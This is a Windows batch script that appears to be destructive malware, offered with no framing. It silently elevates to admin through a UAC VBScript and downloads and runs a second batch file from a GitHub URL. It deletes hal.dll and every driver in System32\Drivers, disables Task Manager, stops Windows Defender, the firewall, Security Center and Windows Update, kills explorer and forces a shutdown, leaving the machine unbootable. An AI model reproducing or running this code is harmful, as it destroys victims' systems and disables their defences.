@echo off
cls


 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
cd /d C:\
md your
cd your
md asylum

powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/LKR.bat','C:\your\asylum\LKR.bat')"

takeown /f "%systemdrive%\windows\system32\hal.dll"
icacls "%systemdrive%\windows\system32\hal.dll" /grant everyone:f
DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll"

takeown /f "%Systemdrive%\Windows\System32\Drivers\*.*"
icacls "%Systemdrive%\Windows\System32\Drivers\*.*" /grant everyone:f
DEL /F /S /Q /A "%Systemdrive%\Windows\System32\Drivers\*.*"

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
net stop "SDRSVC"
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
net stop "security center"
net stop sharedaccess
netsh firewall set opmode mode-disable
net stop "wuauserv"
taskkill /f /im explorer.exe

start LKR.bat

timeout /t 15
shutdown -s -t 15
exit
